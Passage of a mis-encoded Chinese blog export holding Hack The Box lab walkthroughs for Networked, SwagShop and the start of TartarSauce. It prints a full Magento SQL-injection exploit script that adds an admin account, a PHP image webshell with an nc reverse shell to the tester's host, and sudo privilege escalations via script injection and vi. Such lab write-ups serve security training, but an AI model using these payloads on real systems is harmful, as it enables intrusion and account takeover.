è¿™è¾¹ç¡®å®å¯ä»¥è¢«æ‰§è¡Œï¼Œç”±äºæ˜¯æˆ‘ä»¬è°ƒç”¨çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯ apache æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»è®©è„šæœ¬è‡ªåŠ¨æ‰§è¡Œå§ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# socat file:`tty`,raw,echo=0 tcp-listen:5555 [guly@networked ~]$ whoami&amp;&amp;id guly uid=1000(guly) gid=1000(guly) groups=1000(guly) æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ [guly@networked ~]$ cat user.txt c41daff87304452dde58eae1751e49b6 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ Root[guly@networked ~]$ sudo -l Matching Defaults entries for guly on networked: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh å¯ä»¥è°ƒç”¨ root æƒé™æ‰§è¡Œ /usr/local/sbin/changename.sh è„šæœ¬ï¼Œå…ˆå»çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒé™è¿˜æœ‰å¹²ä»€ä¹ˆçš„ [guly@networked ~]$ ls -la /usr/local/sbin/changename.sh -rwxr-xr-x 1 root root 422 Jul 8 2019 /usr/local/sbin/changename.sh [guly@networked ~]$ cat /usr/local/sbin/changename.sh #!/bin/bash -p cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 è¿™é‡Œæ‰¾åˆ°ä¸€ç¯‡å‚è€ƒæ–‡ç«  https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid&#x3D;e026a0c5f83df4fd532442e1324ffa4f è¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯åœ¨æ‰§è¡Œ /usr/local/sbin/changename.sh è„šæœ¬åï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥å››ä¸ªå‚æ•°ï¼Œå…¶ä¸­çš„ name å‚æ•°æˆ‘ä»¬æ˜¯å¯ä»¥æ³¨å…¥å‘½ä»¤çš„ æˆ‘ä»¬å»æ‰§è¡Œ [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: test bash interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: ^C [guly@networked ~]$ clear TERM environment variable not set. [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: test bash interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test [root@networked network-scripts]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ [root@networked network-scripts]# cat /root/root.txt ff05b3ceb986ab66f5728c7cb82e67de æˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"SwagShop - Hackthebox","slug":"Hackthebox - SwagShop","date":"2023-02-17T11:38:36.000Z","updated":"2023-05-20T03:14:23.000Z","comments":true,"path":"2023/02/17/Hackthebox - SwagShop/","link":"","permalink":"http://www.lucifiel.com/2023/02/17/Hackthebox%20-%20SwagShop/","excerpt":"","text":"Hackthebox - SwagShopé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 02:26 CST Warning: 10.10.10.140 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.140 Host is up (0.078s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/17%OT=22%CT=1%CU=30863%PV=Y%DS=2%DC=T%G=Y%TM=63EE758 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1 OS:1NW7%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 993/tcp) HOP RTT ADDRESS 1 117.05 ms 10.10.16.1 2 76.51 ms 10.10.10.140 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds Httpè¿™è¾¹ http ä¼šè·³è½¬åˆ°åŸŸå swagshop.htb ï¼Œå»åŠ å…¥ä¸€ä¸ª hosts è§£æ echo 10.10.10.140 swagshop.htb &gt;&gt; /etc/hosts ä¼¼ä¹æ˜¯ä¸€ä¸ªå•†åŸï¼Œåº•éƒ¨å¯ä»¥å‘ç°è¿™æ˜¯ 2014 å¹´ç‰ˆæœ¬çš„ Magento å»æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# searchsploit magento --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | php/webapps/38651.txt Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Site Scripting | php/webapps/32808.txt Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cross-Site Scripting | php/webapps/32809.txt Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting | php/webapps/32810.txt Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | php/webapps/39838.php Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | php/webapps/37811.py Magento eCommerce - Local File Disclosure | php/webapps/19793.txt Magento eCommerce - Remote Code Execution | xml/webapps/37977.py Magento eCommerce CE v2.3.5-p2 - Blind SQLi | php/webapps/50896.txt Magento Server MAGMI Plugin - Multiple Vulnerabilities | php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | php/webapps/35052.txt Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass | php/webapps/48135.php --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™è¾¹å‘ç°æœ‰ä¸€ä¸ª RCE çš„æ¼æ´ æ¼æ´åˆ©ç”¨æ‹·è´åˆ°æœ¬åœ°åå»æŸ¥çœ‹ä¸€ä¸‹ import requests import base64 import sys target = &quot;http://target.com/&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=&quot;forme&quot;, password=&quot;forme&quot;) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}} r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds forme:forme&quot;.format(target) else: print &quot;DID NOT WORK&quot; import requests import base64 import sys target = &quot;http://swagshop.htb/index.php&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=&quot;lucifiel&quot;, password=&quot;lucifiel&quot;) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}} r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds lucifiel:lucifiel&quot;.format(target) else: print &quot;DID NOT WORK&quot; æ ¹æ®æˆ‘ä»¬éœ€è¦çš„è¿›è¡Œä¿®æ”¹ï¼Œå°†ç¬¬äº”è¡Œçš„åœ°å€æ›´æ”¹ä¸º http://swagshop.htb/index.php ï¼Œå°†ç¬¬äºŒåå››è¡Œçš„è´¦å·å¯†ç æ›´æ”¹ä¸ºæˆ‘ä»¬éœ€è¦çš„è´¦å·å¯†ç  â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# python2 exploit.py WORKED Check http://swagshop.htb/index.php/admin with creds lucifiel:lucifiel ç„¶åå»è¿›è¡Œç™»å½• æˆåŠŸç™»å½• https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper é€šè¿‡ç¿»æ‰¾ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡æ¼æ´ç›¸å…³çš„æ–‡æ¡£ è¿™é‡Œä¾æ¬¡ç‚¹å‡» System â€“&gt; Configuration â€“&gt; Advanced â€“&gt; Developer â€“&gt; Template Settings â€“&gt; Allow Symlinks ç„¶åå°†å®ƒè®¾ç½®ä¸º yesï¼Œç„¶åç‚¹å‡» save config ä¿å­˜ æ¥ç€åˆ¶ä½œå›¾ç‰‡é©¬ echo &#39;&lt;?php&#39; &gt;&gt; shell.php.png echo &#39;passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.7 4444 &gt;/tmp/f&quot;);&#39;&gt;&gt; shell.php.png echo &#39;?&gt;&#39; &gt;&gt; shell.php.png ç„¶åå†ä¾æ¬¡ç‚¹å‡» Catalog -&gt; Manager Categories è¿›è¡Œä¸Šä¼  ç„¶åå»æŸ¥çœ‹ï¼Œä¼šå‘ç°æˆ‘ä»¬çš„å›¾ç‰‡å·²ç»ä¼ ä¸Šå»äº† æœ€åä¸€æ­¥æ˜¯åˆ›å»ºé€šè®¯æ¨¡æ¿å…µæ³¨å…¥æˆ‘ä»¬çš„ payload ç‚¹å‡» Newsletter -&gt; Newsletter Templates -&gt; Add New Template {{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}} è¿™æ˜¯æˆ‘ä»¬è¦å¡«å…¥çš„å†…å®¹ ç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ æœ€åæˆ‘ä»¬ç‚¹å‡» Preview Template é¢„è§ˆæ¨¡æ¿ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.7] from (UNKNOWN) [10.10.10.140] 33206 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) å¾—åˆ°äº†ä¸€ä¸ª shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; æƒé™æå‡$ sudo -l Matching Defaults entries for www-data on swagshop: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ root æƒé™è°ƒç”¨ &#x2F;sur&#x2F;bin&#x2F;vi æ‰§è¡Œæ‰€æœ‰ &#x2F;var&#x2F;www&#x2F;html&#x2F;* çš„æ–‡ä»¶ $ ls -la /var/www/html/ total 720 drwxr-xr-x 12 www-data www-data 4096 Nov 12 2021 . drwxr-xr-x 3 root root 4096 Nov 12 2021 .. -rw-r--r-- 1 www-data www-data 5667 May 7 2014 .htaccess -rw-r--r-- 1 www-data www-data 4568 May 7 2014 .htaccess.sample -rw-r--r-- 1 www-data www-data 10679 May 7 2014 LICENSE.html -rw-r--r-- 1 www-data www-data 10410 May 7 2014 LICENSE.txt -rw-r--r-- 1 www-data www-data 10421 May 7 2014 LICENSE_AFL.txt -rw-r--r-- 1 www-data www-data 585086 May 7 2014 RELEASE_NOTES.txt -rw-r--r-- 1 www-data www-data 2834 May 7 2014 api.php drwxr-xr-x 6 www-data www-data 4096 Nov 12 2021 app -rw-r--r-- 1 www-data www-data 2831 May 7 2014 cron.php -rw-r--r-- 1 www-data www-data 717 May 7 2014 cron.sh drwxr-xr-x 3 www-data www-data 4096 Nov 12 2021 errors -rw-r--r-- 1 www-data www-data 1150 May 7 2014 favicon.ico -rw-r--r-- 1 www-data www-data 5979 May 7 2014 get.php drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 includes -rw-r--r-- 1 www-data www-data 2642 May 7 2014 index.php -rw-r--r-- 1 www-data www-data 2366 May 7 2014 index.php.sample -rw-r--r-- 1 www-data www-data 6441 May 7 2014 install.php drwxr-xr-x 12 www-data www-data 4096 Nov 12 2021 js drwxr-xr-x 13 www-data www-data 4096 Nov 12 2021 lib -rw-r--r-- 1 www-data www-data 1319 May 7 2014 mage drwxrwxrwx 8 www-data www-data 4096 Nov 12 2021 media -rw-r--r-- 1 www-data www-data 886 May 7 2014 php.ini.sample drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 pkginfo drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 shell drwxr-xr-x 5 www-data www-data 4096 Nov 12 2021 skin drwxr-xr-x 10 www-data www-data 4096 Feb 16 13:54 var æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ/var/www/html/ ç›®å½•ä¸‹çš„ä¸œè¥¿è¿˜æ˜¯æŒºå¤šçš„ https://gtfobins.github.io/gtfobins/vi/ æ ¹æ® GTFOBins ä¸Šçš„æç¤ºï¼Œæˆ‘ä»¬åœ¨ vi ç¼–è¾‘ä¸­ï¼Œä½¿ç”¨ :shell å³å¯è·å¾—æƒé™ é‚£æˆ‘ä»¬å»éšä¾¿æ‰§è¡Œä¸€ä¸ªå§ sudo /usr/bin/vi /var/www/html/index.php æ‰§è¡ŒåæŒ‰ ESCï¼Œç„¶åè¾“å…¥ :shell å³å¯ root@swagshop:/var/www/html# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ root@swagshop:/var/www/html# cat /home/haris/user.txt cat /home/haris/user.txt 370cc7d01561ab4da02e53de7ef8d799 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ root@swagshop:/var/www/html# cat /root/root.txt cat /root/root.txt 295e684ef53b47af9e6fc69a3301ee26 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"TartarSauce - Hackthebox","slug":"Hackthebox - TartarSauce","date":"2023-02-11T11:38:36.000Z","updated":"2023-05-20T03:14:46.000Z","comments":true,"path":"2023/02/11/Hackthebox - TartarSauce/","link":"","permalink":"http://www.lucifiel.com/2023/02/11/Hackthebox%20-%20TartarSauce/","excerpt":"","text":"Hackthebox - TartarSauceé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.88 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 CST Warning: 10.10.10.88 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.88 Host is up (0.095s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-title: Landing Page |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/11%OT=80%CT=1%CU=43534%PV=Y%DS=2%DC=T%G=Y%TM=63E78A9 OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ OS:(SP=108%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M537NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 256/tcp) HOP RTT ADDRESS 1 117.74 ms 10.10.16.1 2 74.70 ms 10.10.10.88 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 44.31 seconds Http è¿™ä»€ä¹ˆç©æ„å„¿ï¼Œè™½ç„¶çŸ¥é“æ˜¯å­—ç¬¦ç»„æˆçš„å›¾æ¡ˆï¼Œä½†æ˜¯æˆ‘ç¡®å®çœ‹ä¸å‡ºæ¥æ˜¯å•¥ &lt;!--Carry on, nothing to see here :D--&gt; æºä»£ç æ‹‰åˆ°æœ€åº•ä¸‹ï¼Œæœ‰ä¸€å¥è¿™é‡Œæ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼ŒæŒºçš®çš„ /webservices/tar/tar/source/ /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ /webservices/developmental/ /webservices/phpmyadmin/ åœ¨ nmap æ‰«æçš„æ—¶å€™ï¼Œæœ‰å‡ ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªå»çœ‹ä¸€ä¸‹ http://10.10.10.88/webservices/monstra-3.0.4/ ç„¶ååªæœ‰è¿™ä¸€ä¸ªåœ°å€å¯ä»¥è®¿é—® â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# searchsploit monstra 3.0.4 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution | php/webapps/43348.txt Monstra CMS 3.0.4 - Arbitrary Folder Deletion | php/webapps/44512.txt Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload | php/webapps/48479.txt Monstra cms 3.0.4 - Persitent Cross-Site Scripting | php/webapps/44502.txt Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) | php/webapps/49949.py Monstra CMS &lt; 3.0.4 - Cross-Site Scripting (1) | php/webapps/44855.py Monstra CMS &lt; 3.0.4 - Cross-Site Scripting (2) | php/webapps/44646.txt Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking) | php/webapps/45164.txt --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™ä¸ªç‰ˆæœ¬çš„ Monstra CMS ç¡®å®æ˜¯å¯ä»¥æœç´¢åˆ°æ¼æ´ï¼Œè¿™ä¸ªå…ˆä¸æ€¥ç€çœ‹ ç‚¹å‡»é¦–é¡µçš„ç™»å½•ï¼Œå¯ä»¥è¿›å…¥ç™»å½•é¡µé¢ å¼±å£ä»¤ admin&#x2F;admin æˆåŠŸç™»å½• æ ¹æ®æˆ‘ä»¬æ‰¾åˆ°çš„å‡ ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªä¸ºæ–‡ä»¶ä¸Šä¼ ï¼Œæˆ‘ exploit åˆ©ç”¨æ²¡æˆåŠŸï¼Œæˆ‘å»æ‰‹åŠ¨è¯•è¯• ç‚¹å‡» Dashboard -&gt; upload file -&gt; select file -&gt; upload è¿™é‡Œåˆ©ç”¨æ²¡æœ‰æˆåŠŸï¼Œæˆ‘åˆç¢ç£¨äº†ä¸€é˜µï¼Œå‘ç°æ˜¯ä¸ªå…”å­æ´ Fuzzâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.10.88/webservices/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.88/webservices/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ wp [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 93ms] [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 75ms] :: Progress: [30000/30000] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:26] :: Errors: 2 :: è¿™é‡Œå‘ç°æœ‰ä¸ª wp ä½†æ˜¯æ²¡æœ‰é¡µé¢ å°è¯•è®¿é—® http://10.10.10.88/webservices/wp/wp-admin/ çš„æ—¶å€™ï¼Œè·³è½¬åˆ°äº† tartarsauce.htb ï¼Œå»åŠ å…¥ä¸€ä¸ª hosts è§£æ echo 10.10.10.88 tartarsauce.htb &gt;&gt; /etc/hosts ç„¶åå†è®¿é—®å°±æœ‰é¡µé¢äº†ï¼Œå’±ä»¬å»è®¿é—®ä¸€ä¸‹ wp-admin é¡µé¢ æˆåŠŸæ‰¾åˆ°åå°ï¼Œè¿™ä¸ªæ—¶å€™å»ä½¿ç”¨ wpscan æ‰«æä¸€ä¸‹ Wpscanâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88] [+] Started: Sat Feb 11 21:10:03 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | 